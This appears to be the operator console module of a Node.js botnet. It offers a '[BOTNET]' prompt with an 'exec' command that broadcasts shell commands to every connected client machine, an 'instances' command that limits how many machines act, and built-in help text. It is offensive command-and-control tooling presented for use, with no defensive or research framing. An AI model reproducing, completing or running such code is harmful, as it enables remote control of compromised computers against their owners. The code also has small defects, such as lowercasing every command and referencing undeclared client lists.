const readline = require("readline").createInterface({
	input: process.stdin,
	output: process.stdout,
});
const fs = require("fs");
const server = require("./server.js");

const help = fs.readFileSync("../config/help", "utf8");

const commandsHelp = [
	{
		command: "exec",
		functionality: "Executes shell commands remotely",
		usage: "exec <command>",
	},
	{
		command: "instances",
		functionality: "Limits number of machines running a command",
		usage: "instances <number>",
	},
	{
		command: "help",
		functionality: "Shows you how to use commands",
		usage: "help <command>",
	},
];

function prompt() {
	readline.question("[BOTNET] ", (message) => {
		message = message.toLowerCase();

		if (message === "instances") {
			console.log(`Instances: ${clientInstances.length}`);
		}

		if (message.startsWith("instances")) {
			if (message.split(" ")[1] <= clients.length) {
				clientInstances = [...clients];
				clientInstances = clientInstances.slice(0, message.split(" ")[1]);
			}
		}

		if (message.split(" ")[1] === "all") clientInstances = [...clients];

		if (message === "help") console.log(`\n${help}`);

		if (message.startsWith("help")) {
			if (
				commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
				0
			) {
				let commandIndex = commandsHelp
					.map((i) => i.command)
					.indexOf(message.split(" ")[1]);

				console.log(
					`Functionality: ${commandsHelp[commandIndex].functionality}\nUsage: ${commandsHelp[commandIndex].usage}\n`
				);
			}
		}

		if (message.startsWith("exec")) server.broadcast(message);

		return prompt();
	});
}

module.exports = {
	prompt: prompt,
};
